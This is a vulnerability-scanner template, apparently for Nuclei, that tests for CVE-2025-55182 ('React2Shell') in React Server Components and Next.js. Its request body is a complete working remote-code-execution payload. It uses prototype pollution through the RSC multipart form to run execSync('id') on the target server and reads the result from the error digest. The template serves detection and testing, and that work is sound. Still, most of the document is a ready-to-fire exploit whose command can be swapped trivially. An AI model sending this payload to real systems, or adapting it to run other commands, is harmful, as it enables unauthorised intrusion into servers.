id: react2shell-cve-2025-55182-rce-body-id

info:
  name: React2Shell React Server Components RCE (CVE-2025-55182) â€“ exploitability check
  author: hxorz
  severity: high
  description: |
  Actively checks whether a target is vulnerable to CVE-2025-55182 by sending a
  crafted React Server Components (RSC) exploit payload, based on the public
  React2Shell technique described by msanft.

  The payload triggers execution of the `id` command on the server and extracts
  the resulting output from the RSC error digest field in the HTTP response,
  confirming remote code execution.

  reference:
    - https://github.com/msanft/CVE-2025-55182
    - https://github.com/subzer0x0/React2Shell
  tags: rsc,react,nextjs,react2shell,rce,cve,cve-2025-55182

http:
  - method: POST
    path:
      - "{{BaseURL}}/"

    headers:
      User-Agent: "Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
      Accept: "*/*"
      Accept-Language: "en"
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
      Next-Action: "x"
      X-Nextjs-Html-Request-Id: "SSTMXm7OJ_g0Ncx6jpQt9"
      X-Nextjs-Request-Id: "b5dce965"
      Accept-Encoding: "gzip"

    body: |
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
      Content-Disposition: form-data; name="0"

      {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\":\"$B1337\"}",
        "_response": {
          "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
          "_chunks": "$Q2",
          "_formData": {
            "get": "$1:constructor:constructor"
          }
        }
      }
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
      Content-Disposition: form-data; name="1"

      "$@0"
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
      Content-Disposition: form-data; name="2"

      []
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500

      - type: word
        part: header
        words:
          - "text/x-component"

      - type: regex
        part: body
        regex:
          - '"digest":"uid=.*?gid=.*?groups=.*?"'

    extractors:
      - type: regex
        part: body
        name: rce-id-output
        group: 0
        regex:
          - '"digest":"(uid=.*?gid=.*?groups=.*?)"'

